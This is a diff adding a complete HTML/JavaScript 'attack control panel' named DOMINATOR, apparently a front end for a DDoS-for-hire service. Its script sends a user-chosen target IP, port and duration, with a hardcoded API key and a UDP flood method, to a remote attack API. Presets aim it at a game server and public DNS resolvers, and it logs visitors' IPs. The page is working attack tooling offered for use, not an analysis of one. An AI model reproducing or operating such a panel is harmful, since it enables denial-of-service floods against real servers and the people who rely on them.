@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOMINATOR - Attack Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container { max-width: 550px; width: 100%; }
+        .panel {
+            background: #111;
+            border: 2px solid #ff0044;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 0 50px rgba(255,0,68,0.15);
+        }
+        .title { color: #ff0044; text-align: center; font-size: 32px; font-weight: bold; letter-spacing: 3px; }
+        .subtitle { color: #666; text-align: center; font-size: 11px; margin-bottom: 25px; letter-spacing: 2px; }
+        .info-bar {
+            background: #0a0a0a;
+            border: 1px solid #222;
+            border-radius: 10px;
+            padding: 10px 15px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            color: #666;
+            font-size: 11px;
+            flex-wrap: wrap;
+            gap: 5px;
+        }
+        .info-bar span { color: #00ff88; }
+        .input-group { margin-bottom: 15px; }
+        .input-group label { color: #888; display: block; font-size: 11px; margin-bottom: 5px; letter-spacing: 1px; }
+        .input-group input {
+            width: 100%;
+            padding: 12px 16px;
+            background: #0a0a0a;
+            border: 1px solid #222;
+            border-radius: 10px;
+            color: #00ff88;
+            font-size: 14px;
+            font-family: monospace;
+            outline: none;
+            transition: border 0.3s;
+        }
+        .input-group input:focus { border-color: #ff0044; }
+        .row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .presets { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 15px; justify-content: center; }
+        .preset-btn {
+            padding: 5px 14px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 6px;
+            color: #888;
+            font-size: 10px;
+            cursor: pointer;
+            font-family: monospace;
+            transition: all 0.3s;
+        }
+        .preset-btn:hover { background: #2a2a2a; border-color: #ff0044; color: #ff0044; }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #ff0044;
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: monospace;
+            letter-spacing: 2px;
+        }
+        .btn:hover { background: #cc0033; transform: scale(1.01); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .status-msg {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 13px;
+            display: none;
+        }
+        .status-msg.success { display: block; background: #003322; border: 1px solid #00ff88; color: #00ff88; }
+        .status-msg.error { display: block; background: #330011; border: 1px solid #ff0044; color: #ff0044; }
+        .status-msg.loading { display: block; background: #112233; border: 1px solid #ffaa00; color: #ffaa00; }
+        .logs-section { margin-top: 25px; border-top: 1px solid #222; padding-top: 20px; }
+        .logs-title { color: #888; font-size: 11px; margin-bottom: 10px; letter-spacing: 1px; }
+        .logs-title span { color: #ff0044; }
+        .log-entry {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            padding: 8px 12px;
+            margin-bottom: 5px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 10px;
+            color: #666;
+            font-family: monospace;
+            flex-wrap: wrap;
+            gap: 5px;
+        }
+        .log-entry .ip { color: #00ff88; }
+        .log-entry .target { color: #ffaa00; }
+        .log-entry .time { color: #444; }
+        .footer { text-align: center; color: #333; font-size: 10px; margin-top: 20px; }
+        .live-badge {
+            display: inline-block;
+            background: #ff0044;
+            color: white;
+            font-size: 8px;
+            padding: 2px 8px;
+            border-radius: 10px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        @media (max-width: 600px) {
+            .row-2 { grid-template-columns: 1fr; }
+            .panel { padding: 20px; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+<div class="panel">
+<div class="title">🔥 DOMINATOR</div>
+<div class="subtitle">⚡ ATTACK CONTROL PANEL</div>
+
+<div class="info-bar">
+    <div>🌐 YOUR IP: <span id="visitorIp">Loading...</span></div>
+    <div>⚡ STATUS: <span style="color:#00ff88;">READY</span></div>
+</div>
+
+<div class="presets">
+    <button class="preset-btn" onclick="setTarget('91.108.17.19','32000')">PUBG</button>
+    <button class="preset-btn" onclick="setTarget('8.8.8.8','53')">DNS</button>
+    <button class="preset-btn" onclick="setTarget('1.1.1.1','53')">Cloudflare</button>
+    <button class="preset-btn" onclick="setTarget('192.168.1.1','80')">Local</button>
+</div>
+
+<div class="input-group"><label>🎯 TARGET IP</label><input type="text" id="attackIp" placeholder="Enter IP" value="91.108.17.19"></div>
+<div class="row-2">
+    <div class="input-group"><label>🔌 PORT</label><input type="number" id="attackPort" placeholder="Port" value="32000"></div>
+    <div class="input-group"><label>⏱️ DURATION (seconds)</label><input type="number" id="attackTime" placeholder="60" value="60"></div>
+</div>
+
+<button class="btn" id="attackBtn" onclick="executeAttack()">💀 EXECUTE ATTACK</button>
+<div id="attackStatus" class="status-msg"></div>
+
+<div class="logs-section">
+    <div class="logs-title">📋 ATTACK LOGS <span class="live-badge">LIVE</span></div>
+    <div id="logsContainer"><div style="color:#444;text-align:center;padding:20px;font-size:12px;">⏳ Waiting for attacks...</div></div>
+</div>
+
+<div class="footer">DOMINATOR · All Rights Reserved</div>
+</div>
+</div>
+
+<script>
+const API_BASE = "http://139.162.28.5:1010/api/v1/attack/start";
+const API_KEY = "nk_740a136564ae4b1393f4179a1f579ded";
+const METHOD = "UDP-BIG";
+let attackLogs = JSON.parse(localStorage.getItem('attackLogs') || '[]');
+
+fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(d => document.getElementById('visitorIp').textContent = d.ip)
+    .catch(() => document.getElementById('visitorIp').textContent = 'Unknown');
+
+function setTarget(ip, port) {
+    document.getElementById('attackIp').value = ip;
+    document.getElementById('attackPort').value = port;
+}
+
+function addLog(ip, target, port, time, status) {
+    const now = new Date();
+    const timeStr = now.toLocaleTimeString();
+    attackLogs.unshift({ ip, target, port, time, status, timeStr });
+    if (attackLogs.length > 50) attackLogs.pop();
+    localStorage.setItem('attackLogs', JSON.stringify(attackLogs));
+    renderLogs();
+}
+
+function renderLogs() {
+    const container = document.getElementById('logsContainer');
+    if (attackLogs.length === 0) {
+        container.innerHTML = '<div style="color:#444;text-align:center;padding:20px;font-size:12px;">⏳ Waiting for attacks...</div>';
+        return;
+    }
+    container.innerHTML = attackLogs.map(l => `
+        <div class="log-entry">
+            <span class="ip">🌐 ${l.ip}</span>
+            <span class="target">🎯 ${l.target}:${l.port}</span>
+            <span>⏱️ ${l.time}s</span>
+            <span>${l.status === 'success' ? '✅' : '❌'}</span>
+            <span class="time">${l.timeStr}</span>
+        </div>
+    `).join('');
+}
+
+function showAttackStatus(msg, type) {
+    const el = document.getElementById('attackStatus');
+    el.textContent = msg;
+    el.className = 'status-msg ' + type;
+    if (type !== 'loading') {
+        setTimeout(() => { el.className = 'status-msg'; }, 5000);
+    }
+}
+
+function executeAttack() {
+    const ip = document.getElementById('attackIp').value.trim();
+    const port = document.getElementById('attackPort').value.trim();
+    const time = document.getElementById('attackTime').value.trim();
+
+    if (!ip || !port || !time) {
+        showAttackStatus('❌ Please fill all fields!', 'error');
+        return;
+    }
+    if (isNaN(port) || isNaN(time) || port < 1 || port > 65535) {
+        showAttackStatus('❌ Invalid port (1-65535) or time!', 'error');
+        return;
+    }
+
+    const btn = document.getElementById('attackBtn');
+    btn.disabled = true;
+    btn.textContent = '⏳ SENDING...';
+    showAttackStatus('⏳ Sending attack request...', 'loading');
+
+    let visitorIp = document.getElementById('visitorIp').textContent;
+    if (visitorIp === 'Loading...' || visitorIp === 'Unknown') visitorIp = 'Unknown';
+
+    const url = `${API_BASE}?key=${API_KEY}&host=${ip}&port=${port}&time=${time}&method=${METHOD}`;
+
+    fetch(url)
+        .then(r => r.json())
+        .then(d => {
+            btn.disabled = false;
+            btn.textContent = '💀 EXECUTE ATTACK';
+            if (d.status === 'success' || d.message || d.attack_id) {
+                showAttackStatus(`✅ ATTACK SENT! Target: ${ip}:${port} for ${time}s`, 'success');
+                addLog(visitorIp, ip, port, time, 'success');
+            } else {
+                showAttackStatus(`❌ Error: ${d.message || 'Unknown error'}`, 'error');
+                addLog(visitorIp, ip, port, time, 'error');
+            }
+        })
+        .catch(e => {
+            btn.disabled = false;
+            btn.textContent = '💀 EXECUTE ATTACK';
+            showAttackStatus(`❌ Network Error: ${e.message}`, 'error');
+            addLog(visitorIp, ip, port, time, 'error');
+        });
+}
+
+renderLogs();
+</script>
+</body>
+</html>
